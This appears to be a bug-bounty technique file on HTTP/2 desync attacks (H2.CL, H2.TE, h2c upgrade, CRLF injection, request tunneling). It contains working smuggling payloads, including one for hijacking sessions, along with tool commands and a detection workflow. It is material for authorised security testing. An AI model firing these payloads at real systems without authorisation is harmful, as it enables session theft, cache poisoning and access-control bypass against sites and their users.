# H2 Desync Attacks (HTTP/2 Request Smuggling) Skill

**Trigger:** H2 desync, HTTP/2 smuggling, H2.CL, H2.TE, H2C upgrade, HTTP/2 request smuggling
**Payout Ceiling:** Critical ($5K–$50K) | **Extends HTTP/1.1 smuggling to H2 context — different technique**
**Prerequisite:** Read `a technique-reference note` for H1 baseline

---

## H2 vs H1 Smuggling — Key Differences

HTTP/2 is a binary framing protocol — it doesn't use raw headers like `Content-Length` or
`Transfer-Encoding` for multiplexing. But when H2 traffic is DOWNGRADED to H1 by CDNs/proxies,
the H1 headers in that downgraded connection can still be manipulated.

```
Client → [H2] → CDN/Load Balancer → [H1] → Backend Server
                                     ↑
              THIS is where H2 desync happens
              (CDN downgrades H2→H1, mishandles headers)
```

---

## Attack Classes

### H2.CL — HTTP/2 Content-Length Injection

```
The attacker sends an H2 request with:
- H2 frame length (auto-calculated by H2 protocol) = N bytes
- A Content-Length header = DIFFERENT value (smaller than frame size)

The CDN forwards the H1 request using the injected Content-Length value.
The backend thinks the request ended at byte M — the remaining bytes are
treated as the START of the next request.
```

**Burp Suite — H2 CL Smuggle:**
```
# In Burp Repeater → switch to HTTP/2
# Add Content-Length header manually (Inspector panel → Add header)
POST / HTTP/2
Host: target.com
Content-Length: 0    ← injected (mismatches actual body length)

GET /admin HTTP/1.1
Host: target.com
X-Ignore: x    ← This becomes a "poisoned prefix" for the next request
```

### H2.TE — HTTP/2 Transfer-Encoding Injection

```
Similar to H1 TE.CL smuggling — inject Transfer-Encoding: chunked header in H2 request.
H2 itself doesn't use TE, but the CDN may forward it to the H1 backend naively.
```

**Payload:**
```
POST / HTTP/2
Host: target.com
Transfer-Encoding: chunked     ← injected H2 header
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Host: target.com
```

### H2C Upgrade Attack — HTTP to HTTP/2 Cleartext Upgrade

```
Some reverse proxies forward HTTP Upgrade requests without sanitizing them.
An attacker can "upgrade" an HTTP/1.1 connection to H2C (HTTP/2 cleartext) on
an endpoint that shouldn't allow it, bypassing authentication middleware.
```

**Attack:**
```http
GET /internal/admin HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQAAP__
Connection: Upgrade, HTTP2-Settings

# If the proxy forwards this and the backend speaks H2C:
# Request goes directly to backend bypassing auth middleware
```

### H2 Header Injection (Pseudo-Headers)

```
H2 pseudo-headers (:method, :path, :authority, :scheme) can sometimes be injected
or manipulated if the H2 implementation doesn't properly validate them.
```

**Examples:**
```
:path: /admin%0d%0aX-Injected-Header: value
:authority: target.com%0d%0aHost: internal.target.com
```

---

## Tooling

### Burp Suite (Primary)
```
1. Open Repeater → switch to HTTP/2
2. Right-click in Request panel → "Change request method to HTTP/2"
3. Inspector panel → manually add Content-Length or Transfer-Encoding
4. Send → observe smuggling behavior
5. Extension: HTTP Request Smuggler (auto-detect via "Launch" in scanner)
```

### h2csmuggler (H2C Upgrade Testing)
```bash
# github.com/BishopFox/h2csmuggler
python3 h2csmuggler.py -x https://target.com/internal/endpoint
```

### Turbo Intruder (Timing-Based H2 Detection)
```python
# scripts/race.py with HTTP/2 support
# Use for concurrent H2 requests to detect desync timing
```

---

## Detection Workflow

### Phase 1 — Check for H2 Support
```bash
# Does the target speak HTTP/2?
curl --http2 -I https://target.com/ | grep "HTTP/"
# HTTP/2 200 → H2 supported

# Using Burp: check HTTP history for HTTP/2 in version column
```

### Phase 2 — Identify H1 Backend (Downgrade Point)
```bash
# Look for CDN/proxy indicators:
# - Via: header in response
# - X-Cache, X-Forwarded-For in response
# - Different server header behaviors

# Most H2 desync attacks require an H2-terminating proxy in front of H1 backend
```

### Phase 3 — Test H2.CL
```
In Burp Repeater (HTTP/2 mode):
1. POST request with body
2. Add Content-Length: 0 header (Inspector → Add)
3. Put smuggled prefix in body
4. Send → observe if prefix poisons next request
```

### Phase 4 — Test H2C Upgrade
```bash
h2csmuggler.py -x https://target.com/api/internal/admin
# If bypasses auth → Critical
```

---

## H2 vs H1 Desync Comparison

| Variant | Protocol | Attack Vector | CDN Required |
|---------|----------|---------------|--------------|
| CL.TE | HTTP/1.1 | CL mismatch | No (direct) |
| TE.CL | HTTP/1.1 | TE mismatch | No (direct) |
| H2.CL | HTTP/2 | CL injection in H2 | YES (CDN downgrades) |
| H2.TE | HTTP/2 | TE injection in H2 | YES |
| H2C Upgrade | HTTP/1.1→H2 | Upgrade bypass | YES (proxy) |

---

## Impact Chains

| Finding | Chain | Payout |
|---------|-------|--------|
| H2 Desync alone | WAF bypass, admin access, response splitting | High-Critical |
| H2 Desync + Cache Poisoning | CDN-scale XSS (all users) | Critical |
| H2C Upgrade + Auth Bypass | Internal endpoint access | Critical |
| H2 Desync + SSRF | Internal service access | Critical |

---

## Resources
- James Kettle's HTTP/2 research (PortSwigger Blog 2021–2023)
- PortSwigger Web Security Academy: HTTP/2 request smuggling labs
- Burp Suite HTTP Request Smuggler extension

---

---

## Advanced Techniques (KB Part 2)

### CRLF Injection via H2 Header Values
```
HTTP/2 allows arbitrary bytes in header values (it's a binary protocol).
Inject \r\n sequences into H2 header names or values.
When the CDN converts H2→H1, these become additional headers,
enabling header injection, TE smuggling, and advanced desync chains.
```

**Payload:**
```
POST / HTTP/2
Host: target.com
foo: bar\r\nTransfer-Encoding: chunked

← After H2→H1 conversion, backend sees an additional header:
Transfer-Encoding: chunked
```

Detection: Front-end fails to strip injected CRLF; backend parses it as an additional header.

### Request Tunneling (vs Full Desync)
```
Request tunneling is a more limited but stealthy form.
You tunnel a complete second HTTP request inside the body of the first.
Useful when full socket-level desync is blocked but tunneling is possible.
```

**Confirmation technique:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
0

GET / HTTP/1.1
Host: target.com

```

If you receive TWO HTTP responses for ONE request → tunneling confirmed.

**Uses for request tunneling:**
- Leak internal headers added by proxy (via response body bleed)
- HEAD-based cache poisoning with tunneled responses
- Access internal-only endpoints via tunneled requests

### Session Hijacking Payload (Full)
```
POST / HTTP/2
Content-Length: 80

GET / HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SESSION  ← captured from next request in connection pool
```

When the next victim's request arrives on the shared backend connection,
their credentials/cookies are appended to your smuggled request and returned in your response.

### Additional Tool: http2smugl
```bash
# Emil Lerner's http2smugl — automated H2 desync detection
# https://github.com/neex/http2smugl
python3 http2smugl.py detect https://target.com
# Probes for H2.TE, H2.CL, and CRLF injection variants automatically
```

### TRACE Method Probing
```bash
# TRACE shows what headers the backend actually received
# After injecting headers via CRLF or H2 manipulation, use TRACE to confirm
curl -X TRACE https://target.com/ -H "X-Inject: test"
# Response body contains the headers the backend saw — confirms injection success
```

## Extended Impact Chain Table

| Variant | Chain | Payout |
|---------|-------|--------|
| H2.TE desync | Session hijack → ATO | Critical |
| H2C upgrade | Access control bypass → admin panel | Critical |
| Request tunneling | Internal header leak → SSRF via internal routing | High-Critical |
| H2 CRLF injection | TE header injection → full smuggling | Critical |
| H2 desync + cache | Cache poisoning → XSS at CDN scale (all users) | Critical |

## Real-World Bounty Reference
- AWS ALB H2.TE desync: affected nearly every site on ALB (Netflix: $20K, CVE-2021-21295)
- 2024–2025 combined bounties for H2 desync variants exceeded $350K total

## References

- PortSwigger H2 research: https://portswigger.net/research/http2
- James Kettle HTTP/2 research blog posts (2021–2023)
- Outpost24 H2 walkthrough: https://outpost24.com/blog/request-smuggling-http-2-downgrading/
- h2cSmuggler: https://github.com/BishopFox/h2csmuggler
- http2smugl: https://lab.wallarm.com/http2smugl-http2-request-smuggling-security-testing-tool/
- InstaTunnel deep dive: https://medium.com/@instatunnel/http-2-desync-request-smugglings-stealthy-evolution-a29dff830779

---

## Technique Reference (merged from h2-desync.md, 2026-04-29)

### Burp Suite Project Options (required setup)
```
Project Options → HTTP → HTTP/2:
  ✓ Enable HTTP/2
  ✓ Allow HTTP/2 connection reuse
```

### Quick Confirmation Commands
```bash
# Raw H2 frame inspection
nghttp -v https://target.com/

# H2C cleartext check (will the backend accept HTTP/2 over HTTP/1.1 upgrade?)
curl -v --http2-prior-knowledge https://target.com/

# Confirm an H2 → H1 downgrade is happening (prerequisite for H2.CL/H2.TE)
curl -v --http2 https://target.com/ 2>&1 | grep "< HTTP"
# If backend responds HTTP/1.1 → downgrade confirmed → desync possible
```

### Turbo Intruder Concurrent Single-Packet Probe
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=20,
                           pipeline=True)
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if req.status != 200:
        table.add(req)
```

### Bypass / Edge Cases
- CDNs may normalize H2 headers before backend → smuggling not possible
- H2C (cleartext) smuggling via `Upgrade: h2c` on HTTP/1.1 endpoint
- CONNECT method tunnels can bypass H2 restrictions
- Load balancers reusing backend connections = highest-value targets
- End-to-end HTTP/2 (no H1 downgrade) = immune

### Remediation Signals (note in report)
- End-to-end HTTP/2 to backend (no downgrade) — immune
- `Connection: close` between proxy and backend — breaks smuggling
- Strict content-length validation on backend
- Disabling HTTP/1.1 on backend entirely

### Filing Guidance
**Evidence required:** Show the smuggled request + poisoned response from a different user/request. Timing differential alone = informational. Actual response from poisoned connection = High/Critical.

**Impact chain:**
- Response queue poison → steal other users' responses → ATO = Critical
- Cache poison → stored XSS delivery to all users = High
- Admin panel access via smuggled request = High

---

*Enhanced by KB Part 2 ingestion 2026-03-04*
*Technique reference merged from h2-desync.md on 2026-04-29 (consolidation of duplicate skill)*

*Skill: h2-desync-attacks | Created 2026-03-04 | GAP-E from strategic study | Extends HTTP smuggling to H2 | Ceiling: Critical ($5K–$50K)*
